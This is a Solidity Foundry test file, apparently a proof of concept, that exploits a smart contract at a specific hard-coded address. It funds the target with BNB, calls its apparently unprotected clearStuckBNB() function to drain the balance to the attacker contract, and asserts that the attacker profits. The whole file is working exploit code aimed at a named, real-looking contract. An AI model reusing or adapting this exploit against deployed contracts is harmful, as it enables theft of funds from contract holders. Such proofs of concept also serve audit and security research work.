// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll inject BNB in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, give the target contract some BNB to drain
        uint256 contractBalance = 10 ether;
        deal(TARGET, contractBalance);

        // Record initial attacker balance
        uint256 initialAttackerBalance = address(this).balance;

        // Call the vulnerable function to drain BNB
        (bool success, ) = TARGET.call(abi.encodeWithSignature("clearStuckBNB()"));
        require(success, "Call failed");

        // Verify balance increased
        uint256 finalAttackerBalance = address(this).balance;
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");

        // Also verify contract BNB is drained (optional)
        assertEq(TARGET.balance, 0, "Contract should have 0 BNB");
        assertGt(finalAttackerBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
